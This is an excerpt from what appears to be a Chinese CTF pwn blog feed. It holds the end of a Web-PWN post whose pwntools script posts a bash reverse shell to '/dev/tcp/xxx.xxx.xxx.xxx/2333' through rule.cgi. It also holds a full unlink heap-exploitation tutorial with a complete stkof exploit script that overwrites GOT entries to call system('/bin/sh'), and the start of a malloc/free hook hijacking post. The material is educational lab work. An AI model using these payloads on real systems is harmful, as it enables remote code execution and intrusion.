0&gt;&amp;1</code></li><li>这样目标靶机就连接上了我们的服务器，并且在我们服务器这边具有执行目标靶机目录的权限，也可以看到执行后的结果，这时我们就可以得到 flag</li></ul></li></ul><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">24279</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;pwner\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">250</span> +<span class="string">&#x27;/bin/bash\x00&#x27;</span></span><br><span class="line">s = b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line">body = <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1\n\r&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;POST /rule.cgi\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Content-Length: &#123;&#125;\r\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(body))</span><br><span class="line">payload += <span class="string">&#x27;Authorization: Basic &#x27;</span>+ s +<span class="string">&#x27;\r\n\n&#x27;</span></span><br><span class="line">payload += body</span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Web-PWN </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2025/03/11/unlink/"/>
      <url>/2025/03/11/unlink/</url>
      
        <content type="html"><![CDATA[<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h3 id="unlink是什么？"><a href="#unlink是什么？" class="headerlink" title="unlink是什么？"></a>unlink是什么？</h3><p><a href="https://ftp.gnu.org/gnu/glibc/">Index of /gnu/glibc</a></p><p>unlink其实是libc中定义的一个宏，定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;      </span><br><span class="line">    BK = P-&gt;bk;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;      </span><br><span class="line">        FD-&gt;bk = BK;      </span><br><span class="line">        BK-&gt;fd = FD;      </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">      malloc_printerr (check_action,      </span><br><span class="line">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">       P, AV);      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      </span><br><span class="line">                <span class="keyword">else</span> &#123;      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      </span><br><span class="line">                  &#125;      </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">              &#125;      </span><br><span class="line">          &#125;      </span><br><span class="line">      &#125;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="何时执行unlink"><a href="#何时执行unlink" class="headerlink" title="何时执行unlink"></a>何时执行unlink</h3><p>在执行free()函数时执行了 _int_free()函数，在_int_free()函数中调用了unlink宏，大概的意思如下（注意_int_free()是函数不是宏）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">_int_free()&#123;</span><br><span class="line">unlink();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆释放"><a href="#堆释放" class="headerlink" title="堆释放"></a>堆释放</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">//gcc -g test.c -o test</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> </span><br><span class="line"> <span class="number">4</span> <span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="number">5</span>         <span class="type">long</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">6</span>         <span class="type">long</span> *first_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">7</span>         <span class="type">long</span> *chunk3 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">8</span>         <span class="type">long</span> *second_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">9</span>         <span class="type">long</span> *chunk5 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">10</span>         <span class="type">long</span> *third_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">11</span>         <span class="type">long</span> *chunk7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">12</span>         </span><br><span class="line"><span class="number">13</span>         <span class="built_in">free</span>(first_chunk);</span><br><span class="line"><span class="number">14</span>         <span class="built_in">free</span>(second_chunk);</span><br><span class="line"><span class="number">15</span>         <span class="built_in">free</span>(third_chunk);</span><br><span class="line"><span class="number">16</span>  </span><br><span class="line"><span class="number">17</span>         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">18</span> &#125;</span><br></pre></td></tr></table></figure><p>这里申请了7个chunk，接着依次释放了first_chunk、second_chunk、third_chunk。这里为什么释放这几个chunk呢，<strong><em>因为地址相邻的chunk释放之后会进行合并</em></strong>，地址不相邻的时候不会合并。由于申请的是0x80的chunk，所以在释放之后不会进fastbin而是先进unsortbin。</p><ul><li>first_bk -&gt; second</li><li>second_fd -&gt; first 、 second_bk -&gt; third</li><li>third_fd -&gt; second</li></ul><p><img src="/2025/03/11/unlink/image-20250406114803978.png" alt="image-20250406114803978"></p><p>unlink其实是想把second_chunk摘掉，如果second_chunk被摘掉，那么就会变成下面这样：</p><p><img src="/2025/03/11/unlink/image-20250406114927945.png" alt="image-20250406114927945"></p><h3 id="chunk状态检查"><a href="#chunk状态检查" class="headerlink" title="chunk状态检查"></a>chunk状态检查</h3><p>现在我们用的大多数linux都会对chunk状态进行检查，以免造成二次释放或者二次申请的问题。</p><p>但是检查的流程本身就存在一些问题，能够让我们进行利用。回顾一下以往我们做的题，大部分都是顺着原有的执行流程走，但是通过修改执行所用的数据来改变执行走向。unlink同样可以以这种方式进行利用，由于unlink是在free()函数中调用的，所以我们只看chunk空闲时都需要检查写什么</p><h4 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h4><p>检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p><blockquote><p>如果一个块属于空闲状态，那么相邻高地址块的prev_size为前一个块的大小</p></blockquote><h4 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h4><p>检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p><blockquote><p>如果一个块属于空闲状态，那么相邻高地址块的size的P标志位为0，</p></blockquote><h4 id="check3"><a href="#check3" class="headerlink" title="check3"></a>check3</h4><p>检查前后被释放chunk的fd和bk</p><p>检查前一个释放的bk是否指向自己，后一个的fd是否指向自己</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2025/03/11/unlink/image-20250406130144366.png" alt="image-20250406130144366"></p><p>很怪的程序，没有任何提示或菜单，只能静态分析，操作成功才有回显</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="create"><a href="#create" class="headerlink" title="create"></a>create</h4><p><img src="/2025/03/11/unlink/image-20250406131242513.png" alt="image-20250406131242513"></p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="/2025/03/11/unlink/image-20250406131731627.png" alt="image-20250406131731627"></p><p>输入数据长度没做检测，<strong>堆溢出警告</strong></p><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p><img src="/2025/03/11/unlink/image-20250406131829231.png" alt="image-20250406131829231"></p><p>指针置空，无uaf</p><h4 id="check"><a href="#check" class="headerlink" title="check"></a>check</h4><p>检查是否被使用</p><p><img src="/2025/03/11/unlink/image-20250406132244324.png" alt="image-20250406132244324"></p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>创建3个堆块试试，结果发现出现了6个（加上top_chunk的话理应出现4个），多出来的两个chunk其实是由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区，即初次使用fget()函数和printf()函数的时候</p><p><img src="/2025/03/11/unlink/image-20250406133025014.png" alt="image-20250406133025014"></p><p>这样一来我们可能就无法堆chunk1做什么操作了，因为chunk1是被两个io_chunk包围住的，我们也不能够控制io_chunk。即使一定要利用chunk1的话也只能先通过堆溢出先覆盖io_chunk，但是这样太麻烦了。所以我们可以考虑更加容易利用的chunk2和chunk3，由chunk2溢出至chunk3，也方便控制流程走向</p><h3 id="创建fake-chunk"><a href="#创建fake-chunk" class="headerlink" title="创建fake_chunk"></a>创建fake_chunk</h3><p>利用unlink，势必要有一个空闲块。可以构造空闲块。如果我们在chunk2的data部分伪造一个fake_chunk，并且这个fake_chunk处于释放状态。通过堆溢出的方式和修改chunk3的prev_size和size的P标志位，释放chunk3的时向前合并，这样就能触发unlink了：</p><blockquote><p>地址相邻的chunk释放之后会进行合并</p></blockquote><p><img src="/2025/03/11/unlink/image-20250406133433214.png" alt="image-20250406133433214"></p><p>放在chunk2的data块的chunk大小至少为0x30</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 0x30</span><br></pre></td></tr></table></figure><p>回忆前面的3个check：</p><p>为了能够使得在释放chunk3的时候能够向前合并fake_chunk，并且绕过检查，那么<strong>chunk3的prev_size就要等于fake_chunk的size大小，即0x30</strong>，这样才能说明前一个chunk(fake_chunk)是释放状态</p><p>如果想要触发unlink，那么chunk3的大小就必须超过fast_bin的最大值，<strong>所以chunk3的size就至少是0x90</strong>，并且<strong>chunk3的size的P标志位必须为0</strong>：</p><ul><li>prev_size：我们其实只想通过释放chunk3的时候向前合并fake_chunk，并不需要合并chunk2，所以fake_chunk的prev_size置零就行</li><li>size：其实fake_chunk仅仅需要fd和bk完成unlink流程就可以了，后面的next_prev和next_size仅仅为了检查时候用，所以size的大小为0x20就行</li><li>next_prev：这里其实就是为了绕过检查，证明fake_chunk是一个空闲块，所以next_prev要等于size，即0x20</li><li>next_size：没啥用，不检查这里，用字符串占位就好</li></ul><blockquote><p>上图的fake_chunk的next_prev和next_size指的是：fd_nextsize,bk_nextsize</p><p>注意：只有空闲的（被free掉的）large_chunk才有fd与bk指针,fd_nextsize,bk_nextsize也是如此。</p></blockquote><p><img src="/2025/03/11/unlink/image-20250406135240393.png" alt="image-20250406135240393"></p><p><img src="/2025/03/11/unlink/image-20250406135348129.png" alt="image-20250406135348129"></p><ul><li>fake_fd = first_prev_addr <code>（?）</code></li><li>fake_bk = third_prev_addr<code>（?）</code></li><li>third_fd = fake_prev_addr<code>（✔️）</code></li><li>first_bk = fake_prev_addr<code>（✔️）</code></li></ul><p>所有创建的chunk的data起始地址都记录在ptr_list[]数组中</p><p><img src="/2025/03/11/unlink/image-20250406140020017.png" alt="image-20250406140020017"></p><p><img src="/2025/03/11/unlink/image-20250406140030096.png" alt="image-20250406140030096"></p><p><img src="/2025/03/11/unlink/image-20250406140039099.png" alt="image-20250406140039099"></p><p><img src="/2025/03/11/unlink/image-20250406140113491.png" alt="image-20250406140113491"></p><h3 id="释放chunk3触发unlink"><a href="#释放chunk3触发unlink" class="headerlink" title="释放chunk3触发unlink"></a>释放chunk3触发unlink</h3><p>为什么释放chunk3就会触发unlink呢？首先fake_chunk与chunk3的地址相邻的，由于我们伪造的fake_chunk是空闲状态，所以在释放chunk3的过程中会发生向前合并，也就是说chunk3要与fake_chunk合并成一个大chunk。但是fake_chunk在我们构造的时候为了绕过检查，所以不得不与first_chunk和third_chunk组成双向链表，所以chunk3就需要横刀夺爱将first_chunk从双向链表中抢过来：<br><img src="/2025/03/11/unlink/image-20250406140929258.png" alt="image-20250406140929258"></p><p>chunk3抢fake_chunk的过程其实就相当于将fake_chunk从双向链表中摘除的过程，那么也就相当于执行unlink的过程，接下来我们看fake_chunk被摘除后发生了什么：</p><p><img src="/2025/03/11/unlink/image-20250406140944925.png" alt="image-20250406140944925"></p><p> fake_chunk被摘除之后首先执行的就是<code>first_bk = third_addr</code>，也就是说first_chunk的bk由原来指向fake_chunk地址更改成指向third_chunk地址</p><p>接下来执行<code>third_fd = first_addr</code>，即third_chunk的fd由由原来指向fake_chunk地址更改成first_chunk地址</p><p>这里需要注意的是<code>third_chunk的fd</code>与<code>first_chunk的bk</code>更改的其实是一个位置，但是由于third_fd = first_addr<code>后执行</code>，所以此处内容会从0x602140被覆盖成0x602138</p><p><img src="/2025/03/11/unlink/image-20250406141141497.png" alt="image-20250406141141497"></p><p>因为整个过程中chunk1并没有使用过，所以s[1]并无大碍。但是s[2]的位置原本是chunk2的data指针，经过unlink之后变成了0x602138。最后就是s[3]了，这里原本是chunk3的data指针，但是由于前面为了触发unlink，所以chunk3被释放了，所以s[3]中被置空</p><p>那么我们去想，如果我们在主界面选择修改功能，并且选择修改chunk2，那么实际上输入的内容并不会写进chunk2，而是写进0x602138：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;a&#x27; * 8 + p64(hollkelf.got[&#x27;free&#x27;]) + p64(hollkelf.got[&#x27;puts&#x27;]) + p64(hollkelf.got[&#x27;atoi&#x27;])</span><br></pre></td></tr></table></figure><p><img src="/2025/03/11/unlink/image-20250406141802270.png" alt="image-20250406141802270"></p><p>这样一来free()函数、puts()函数、atoi()函数就已经在s[]数组中部署好了。可以看到如果再次修改s[0]的话其实修改的是free()函数的真实地址，再次修改s[1]的话其实修改的是puts()函数的真实地址，再次修改s[3]的话其实修改的是atoi()函数的真实地址。</p><p>那么接下来，如果将s[0]，即free()函数got中的真实地址修改成puts_plt的话，释放调用free()函数就相当于调用puts()函数了。那么如果释放的是s[1]的话就可以泄露出puts()函数的真实地址了：</p><p>接下来就是释放s[1]了，虽然是调用<code>free(puts_got)</code>，但实际上是<code>puts(puts_got)</code>，需要注意的是我们接收泄露的地址的时候需要用<code>\x00</code>补全，并且用u64()转换一下才能用：</p><p>到了最后一步了，还是用前面的思路，我们将部署在s[2]中的atoi_got中的地址修改成前面找到的system()函数地址，这样一来在接收字符串调用atoi()函数的时候实际上调用的是system()函数：</p><p>最后我们在等待输入的时候输入/bin/sh字符串的地址就可以了，看起来是<code>atoi(/bin/sh)</code>，但实际上执行的是<code>system(/bin/sh)</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./stkof&#x27;</span>) </span><br><span class="line"><span class="comment"># p=remote(&#x27;ip&#x27;,port)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#==================================================================== </span></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">s = <span class="keyword">lambda</span> s : p.send(s) </span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s) </span><br><span class="line">sa = <span class="keyword">lambda</span> n,s : p.sendafter(n,s) </span><br><span class="line">sla = <span class="keyword">lambda</span> n,s : p.sendlineafter(n,s) </span><br><span class="line">r = <span class="keyword">lambda</span> n : p.recv(n) </span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline() </span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s) </span><br><span class="line">ra = <span class="keyword">lambda</span> : p.recvall() </span><br><span class="line">ia = <span class="keyword">lambda</span> : p.interactive() </span><br><span class="line">uu32 = <span class="keyword">lambda</span> data : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line">uu64 = <span class="keyword">lambda</span> data : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line"><span class="comment"># u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) </span></span><br><span class="line"><span class="comment"># u32(p.recvuntil(b&#x27;\\xf7&#x27;)) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(): </span><br><span class="line">    gdb.attach(p) </span><br><span class="line">    pause() </span><br><span class="line"><span class="comment">#==================================================================== </span></span><br><span class="line"><span class="comment"># choose 1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># choose 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;Create fake chunk&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(head - <span class="number">0x8</span>) + p64(head) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+ p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">payload = p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">b&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system_addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;binsh_addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">p.send(p64(binsh_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆入门-__malloc_hook和__free_hook劫持原理</title>
      <link href="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/m0_69107736/article/details/129674212"><strong>malloc_hook和</strong>free_hook劫持原理_freehook-CSDN博客</a></p><p>打堆的一个关键的方法就是劫持堆相关函数中的 <code>hook</code> 函数。即在堆中的三大 <code>hook</code> 函数，<code>malloc_hook</code>、<code>realloc_hook</code>、<code>free_hook</code></p><h2 id="Hook介绍"><a href="#Hook介绍" class="headerlink" title="Hook介绍"></a>Hook介绍</h2><ul><li><code>hook</code> 的就是劫持函数指针，控制程序的执行，让函数执行我们所指定的函数。<ul><li><code>hook</code> 翻译过来是<code>钩子</code>。假设 <code>a</code> 函数中有这样一个执行过程：<code>判断b函数指针是否为空，如果不为空就先b函数指针所指向的函数</code>。这样当我们使用 <code>b</code> 钩子的时候，我们在执行 <code>a</code> 函数，执行流就会被 <code>b</code> 钩子给钩过来，这样就达到了执行 <code>b</code> 函数指针所指向的函数地址。</li></ul></li><li>为了方便调试程序，在 <code>glibc</code> 中有四个比较重要的函数指针，分别是 <code>malloc_hook</code>、<code>free_hook</code>、<code>realloc_hook</code>、<code>exit_hook</code>。</li><li>我们可以通过一些堆漏洞或者其他漏洞就可以将原本指向 <code>NULL</code> 的这些函数指针，修改为 <code>one_gadget</code>，这样我们在满足一定的条件后就可以 <code>getshell</code>，这样就是 pwn 中的劫持 <code>hook</code> 函数最常见的用法。</li></ul><h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h2><h3 id="malloc函数流程"><a href="#malloc函数流程" class="headerlink" title="malloc函数流程"></a>malloc函数流程</h3><p><img src="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/malloc函数流程.png" alt="malloc函数流程"></p><h4 id="glibc2-23malloc函数源码"><a href="#glibc2-23malloc函数源码" class="headerlink" title="glibc2.23malloc函数源码"></a>glibc2.23malloc函数源码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//_int_malloc</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ malloc ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span 